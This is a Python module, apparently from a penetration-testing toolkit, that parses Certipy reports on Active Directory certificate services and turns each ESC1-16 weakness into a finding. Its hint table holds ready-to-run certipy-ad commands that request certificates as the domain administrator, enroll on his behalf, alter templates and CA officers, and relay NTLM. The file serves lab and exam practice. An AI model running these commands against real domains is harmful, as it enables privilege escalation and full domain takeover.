"""certipy.py - parse `certipy-ad find -json` output into ADCS cert_template
Evidence + per-ESC findings.

iter-23 (corpus mine wwzwk72m3): the modern ADCS box loot is Certipy's JSON
report - a top-level dict with 'Certificate Authorities' and 'Certificate
Templates' sections enumerating ESC1-16 vulnerabilities the operator has
already proven enrollable. We surface each vulnerable template as a CRITICAL
finding with a concrete per-ESC certipy command, and emit Evidence
(kind='cert_template', meta={ca, template, esc_list, enroll_principals}) so
correlate.py can chain it to known plaintext creds (R-ADCS family).

Files this adapter claims:
  - *_Certipy.json     (the default name Certipy writes)
  - *_Certipy.txt      (text variant; we parse JSON sections via heuristics)
  - any .json whose top-level keys include 'Certificate Authorities' AND
    'Certificate Templates' (sniffed)
"""
import os
import json
from analyzers.ingest.evidence import Evidence


# ESC1-16 vulnerability tags Certipy reports under '[!] Vulnerabilities'.
# Mapping the tag to a concrete exam-legal certipy exploit command keeps the
# operator from re-googling the abuse for each template.
_ESC_HINTS = {
    "ESC1": ("Enrollee supplies subject + ClientAuth EKU - request a cert as DA.",
             "certipy-ad req -u '{user}@{dom}' -p '{pw}' -ca '{ca}' -template "
             "'{template}' -upn 'administrator@{dom}'"),
    "ESC2": ("Any-purpose EKU - request cert and use it for client auth.",
             "certipy-ad req -u '{user}@{dom}' -p '{pw}' -ca '{ca}' -template "
             "'{template}' -upn 'administrator@{dom}'"),
    "ESC3": ("Enrollment Agent template - enroll on behalf of DA.",
             "certipy-ad req -u '{user}@{dom}' -p '{pw}' -ca '{ca}' -template "
             "'{template}' -on-behalf-of '{dom}\\administrator' -pfx ea.pfx"),
    "ESC4": ("Vulnerable template ACL - operator can edit template to ESC1.",
             "certipy-ad template -u '{user}@{dom}' -p '{pw}' -template "
             "'{template}' -save-old; then enroll like ESC1"),
    "ESC5": ("Vulnerable PKI object ACL - persist via CA config change.",
             "certipy-ad relay (LAB-ONLY) or local-admin to CA host"),
    "ESC6": ("EDITF_ATTRIBUTESUBJECTALTNAME2 on CA - enroll any template w/ SAN.",
             "certipy-ad req -u '{user}@{dom}' -p '{pw}' -ca '{ca}' -template "
             "User -upn 'administrator@{dom}'"),
    "ESC7": ("CA management ACL grants ManageCA / ManageCertificates.",
             "certipy-ad ca -u '{user}@{dom}' -p '{pw}' -ca '{ca}' -add-officer "
             "'{user}'; -enable-template 'SubCA'; then issue cert and resign"),
    "ESC8": ("HTTP Web Enrollment + NTLM relay [LAB-ONLY on OSCP+ - "
             "relay/Responder are exam-prohibited].",
             "# [LAB-ONLY] certipy-ad relay -ca '{ca}' -template DomainController"),
    "ESC9": ("No security extension - request cert and forge UPN.",
             "certipy-ad req -u '{user}@{dom}' -p '{pw}' -ca '{ca}' -template "
             "'{template}' -upn 'administrator@{dom}'"),
    "ESC10": ("Weak certificate mappings - low-priv user can impersonate via UPN.",
              "certipy-ad shadow auto -u '{user}@{dom}' -p '{pw}' -account "
              "administrator"),
    "ESC11": ("IF_ENFORCEENCRYPTICERTREQUEST disabled - relay over RPC [LAB-ONLY].",
              "# [LAB-ONLY] certipy-ad relay -ca '{ca}' -template DomainController -rpc"),
    "ESC12": ("YubiHSM private key on disk - extract from CA host.",
              "operator with admin on CA: extract YubiHSM-stored key, then sign certs"),
    "ESC13": ("OID-group link abuse - enroll for cert that includes a group.",
              "certipy-ad req -u '{user}@{dom}' -p '{pw}' -ca '{ca}' -template "
              "'{template}'"),
    "ESC14": ("altSecurityIdentities write + weak mapping.",
              "ldap modify altSecurityIdentities on target then certipy-ad auth"),
    "ESC15": ("EKUwu / Schema v1 application policies - request DA cert.",
              "certipy-ad req -u '{user}@{dom}' -p '{pw}' -ca '{ca}' -template "
              "'{template}' -application-policies 'Client Authentication'"),
    "ESC16": ("Security extension globally disabled on CA - request + forge UPN.",
              "certipy-ad req -u '{user}@{dom}' -p '{pw}' -ca '{ca}' -template "
              "'{template}' -upn 'administrator@{dom}'"),
}


def detect(path, head):
    name = os.path.basename(path).lower()
    if name.endswith("_certipy.json") or name.endswith("_certipy.txt"):
        return True
    if name.endswith(".json"):
        h = head[:1024]
        # Certipy JSON top-level keys (handle key-variant casing too)
        if '"Certificate Authorities"' in h and '"Certificate Templates"' in h:
            return True
    return False


def _esc_tags(entry):
    """Pull ESC tags from a Certipy entry's 'Vulnerabilities' or '[!] ...' map.
    Certipy emits {'ESC1': 'Enrollee supplies ...', 'ESC9': '...'}; some
    older versions key by full description. Normalise to ESC-N tokens."""
    v = entry.get("Vulnerabilities") or entry.get("vulnerabilities") or {}
    out = []
    if isinstance(v, dict):
        for k in v.keys():
            k = str(k).strip()
            if k.upper().startswith("ESC") and len(k) <= 6:
                out.append(k.upper())
            else:
                # match "ESC1 - Enrollee supplies..." prefix
                head = k.split(" ", 1)[0].split("-", 1)[0].strip().upper()
                if head.startswith("ESC"):
                    out.append(head)
    elif isinstance(v, list):
        for k in v:
            k = str(k).strip().split(" ", 1)[0].split("-", 1)[0].upper()
            if k.startswith("ESC"):
                out.append(k)
    return list(dict.fromkeys(out))   # dedup, preserve order


def _enroll_principals(entry):
    """Extract enrollment principals (the SIDs/names of who can enroll)."""
    perms = entry.get("Permissions") or entry.get("permissions") or {}
    if not isinstance(perms, dict):
        return []
    enroll = (perms.get("Enrollment Permissions") or
              perms.get("enrollment_permissions") or
              perms.get("Enrollment Rights") or {})
    if isinstance(enroll, dict):
        principals = (enroll.get("Enrollment Rights") or
                      enroll.get("enrollment_rights") or [])
        if isinstance(principals, list):
            return [str(p) for p in principals]
    if isinstance(enroll, list):
        return [str(p) for p in enroll]
    return []


def parse(path, store, report):
    try:
        with open(path, "r", errors="ignore") as fh:
            raw = fh.read()
    except OSError:
        return 0
    try:
        doc = json.loads(raw)
    except (ValueError, TypeError):
        return 0
    if not isinstance(doc, dict):
        return 0

    # CAs - learn host + emit RECON
    cas = doc.get("Certificate Authorities") or doc.get("certificate_authorities") or {}
    ca_names = []
    # iter-69: derive real domain from the CA DNS name so the ESC hint
    # emits 'user@htb.local' instead of 'user@<dom>'. Certipy JSON's DNS
    # Name is FQDN 'ca01.htb.local' - everything past the first dot is
    # the domain. Fallback to store.dominant_domain() (may be empty at
    # ingest time since certipy runs before bloodhound) then '<dom>'.
    _dom = ""
    if isinstance(cas, dict):
        for ca_entry in cas.values():
            if not isinstance(ca_entry, dict):
                continue
            dns = (ca_entry.get("DNS Name") or ca_entry.get("dns_name") or "").strip()
            if "." in dns:
                _dom = dns.split(".", 1)[1].lower()
                break
    if not _dom:
        _dom = store.dominant_domain() or "<dom>"
    if isinstance(cas, dict):
        for ca_key, ca_entry in cas.items():
            if not isinstance(ca_entry, dict):
                continue
            ca_name = ca_entry.get("CA Name") or ca_entry.get("ca_name") or ca_key
            dns = ca_entry.get("DNS Name") or ca_entry.get("dns_name") or ""
            ca_names.append(ca_name)
            if dns:
                store.learn_host(names=[dns])
            # iter-84: set Evidence.domain so store.dominant_domain() picks
            # up the domain we derived from the CA's DNS name (needed for
            # the R-ADCS-ESC1 chain to substitute 'lowuser@htb.local' rather
            # than '<dom>' when certipy is the only adapter that ran).
            store.add(Evidence(kind="service", service="adcs", host=dns,
                               source=path, domain=_dom if _dom != "<dom>" else "",
                               meta={"ca": ca_name}))
            report.add("INFO", "RECON", path, None,
                       f"ADCS CA: {ca_name} ({dns})",
                       f"certipy-ad find -u <u>@{_dom} -p '<p>' -dc-ip <DC> -vulnerable")
            # surface CA-wide ESCs (ESC6, ESC8, ESC11) reported per-CA
            for esc in _esc_tags(ca_entry):
                desc, hint_t = _ESC_HINTS.get(esc, ("ADCS CA vulnerability", ""))
                hint = hint_t.format(user="<u>", pw="<p>", dom=_dom,
                                     ca=ca_name, template="<template>")
                lab_only = esc in ("ESC8", "ESC11")
                sev = "HIGH" if lab_only else "CRITICAL"
                report.add(sev, "INTERESTING FILES", path, None,
                           f"AD CS {esc} on CA {ca_name}: {desc}",
                           hint)
                store.add(Evidence(kind="cert_template", source=path,
                                   meta={"ca": ca_name, "esc": [esc],
                                         "lab_only": lab_only}))

    # Templates - the workhorse: per-template ESC tags
    tmpls = (doc.get("Certificate Templates") or
             doc.get("certificate_templates") or {})
    n = 0
    if isinstance(tmpls, dict):
        for t_key, t_entry in tmpls.items():
            if not isinstance(t_entry, dict):
                continue
            name = (t_entry.get("Template Name") or
                    t_entry.get("template_name") or
                    t_entry.get("cn") or t_key)
            escs = _esc_tags(t_entry)
            if not escs:
                continue
            ca_tag = ca_names[0] if ca_names else "<CA>"
            principals = _enroll_principals(t_entry)
            store.add(Evidence(kind="cert_template", source=path,
                               meta={"template": name, "ca": ca_tag,
                                     "esc": escs,
                                     "enroll": principals}))
            for esc in escs:
                desc, hint_t = _ESC_HINTS.get(esc, ("ADCS template vulnerability", ""))
                hint = hint_t.format(user="<u>", pw="<p>", dom=_dom,
                                     ca=ca_tag, template=name)
                lab_only = esc in ("ESC8", "ESC11")
                sev = "HIGH" if lab_only else "CRITICAL"
                report.add(sev, "INTERESTING FILES", path, None,
                           f"AD CS {esc} vulnerable template '{name}' "
                           f"(CA: {ca_tag}): {desc}",
                           hint)
                n += 1
    if n:
        report.add("INFO", "RECON", path, None,
                   f"Certipy find parsed: {n} vulnerable ESC template/CA finding(s)")
    return n
